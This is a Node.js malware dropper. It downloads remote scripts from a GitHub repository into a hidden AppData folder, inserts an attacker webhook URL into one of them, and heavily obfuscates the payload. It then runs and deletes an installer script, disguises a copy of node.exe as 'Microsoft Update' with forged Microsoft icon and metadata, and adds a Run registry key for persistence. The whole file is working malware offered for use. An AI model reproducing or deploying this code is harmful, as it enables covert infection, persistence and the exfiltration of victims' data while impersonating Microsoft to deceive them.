const fs = require("fs");
const https = require("https");
const path = require("path");
const os = require("os");
const { exec } = require("child_process");
const pngToIco = require("png-to-ico");
const rcedit = require("rcedit");
const JavaScriptObfuscator = require("javascript-obfuscator");

const H00K3_URL = "%WEBHOOK%";
const ICON_URL = "https://img.icons8.com/color/64/microsoft.png";

const appData = process.env.APPDATA || path.join(os.homedir(), "AppData", "Roaming");
const targetDir = path.join(appData, "Microsoft", "Net", "System", "My", "CTLs");

const scriptsToDownload = [
  {
    url: "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/main/f9a75c19da8cdd/imports.js",
    fileName: "imports.js"
  },
  {
    url: "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/main/f9a75c19da8cdd/4i5tyydshnyi.js",
    fileName: "index.js"
  }
];

fs.mkdirSync(targetDir, { recursive: true });

function tryDownload(url) {
  return new Promise((resolve) => {
    https.get(url, (res) => {
      let data = "";
      res.on("data", chunk => data += chunk);
      res.on("end", () => resolve(data));
    }).on("error", () => resolve(null));
  });
}

function downloadFile(url, destination) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(destination);
    https.get(url, (response) => {
      response.pipe(file);
      file.on("finish", () => {
        file.close(resolve);
      });
    }).on("error", (err) => {
      fs.unlink(destination, () => {});
      reject(err);
    });
  });
}

async function setupIcon() {
  const pngPath = path.join(targetDir, "icon.png");
  const icoPath = path.join(targetDir, "icon.ico");

  await downloadFile(ICON_URL, pngPath);
  const buffer = await pngToIco(pngPath);
  fs.writeFileSync(icoPath, buffer);

  return icoPath;
}

function adicionarAoRegistro(fakeExePath, scriptPath) {
  const comando = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Microsoft Update" /t REG_SZ /d "\\"${fakeExePath}\\" \\"${scriptPath}\\"" /f`;
  exec(comando, (err) => {
    if (err) console.error("Erro ao adicionar ao registro:", err);
  });
}

async function processScripts() {
  for (const script of scriptsToDownload) {
    try {
      const raw = await tryDownload(script.url);
      if (!raw) continue;

      let replaced = false;
      let content = raw.split('\n').map(line => {
        if (!replaced && line.includes('H00K = "%WEBHOOK%";')) {
          replaced = true;
          return line.replace('%WEBHOOK%', H00K3_URL);
        }
        return line;
      }).join('\n');

      const filePath = path.join(targetDir, script.fileName);

      if (script.fileName === "index.js") {
        const obfuscated = JavaScriptObfuscator.obfuscate(content, {
          compact: true,
          controlFlowFlattening: true,
          controlFlowFlatteningThreshold: 1,
          deadCodeInjection: true,
          deadCodeInjectionThreshold: 1,
          debugProtection: true,
          disableConsoleOutput: true,
          rotateStringArray: true,
          selfDefending: true,
          stringArray: true,
          stringArrayEncoding: ["rc4"],
          stringArrayThreshold: 1,
          transformObjectKeys: true,
          unicodeEscapeSequence: true
        });
        content = obfuscated.getObfuscatedCode();
      }

      fs.writeFileSync(filePath, content, "utf8");

      if (script.fileName === "imports.js") {
        exec(`node "${filePath}"`, () => {
          try { fs.unlinkSync(filePath); } catch {}
        });
      }
    } catch (err) {
      console.error("Erro ao processar script:", script.fileName, err);
    }
  }
}

async function main() {
  try {
    const icoPath = await setupIcon();

    const nodeOriginalPath = process.execPath;
    const fakeNodePath = path.join(targetDir, "MicrosoftUpdate.exe");
    const indexScriptPath = path.join(targetDir, "index.js");

    fs.copyFileSync(nodeOriginalPath, fakeNodePath);

    await rcedit(fakeNodePath, {
      icon: icoPath,
      "version-string": {
        CompanyName: "Microsoft Corporation",
        FileDescription: "Microsoft Update",
        ProductName: "Microsoft Update",
      },
    });

    await processScripts();

    adicionarAoRegistro(fakeNodePath, indexScriptPath);

  } catch (e) {
    console.error("Erro geral:", e);
  }
}

main();
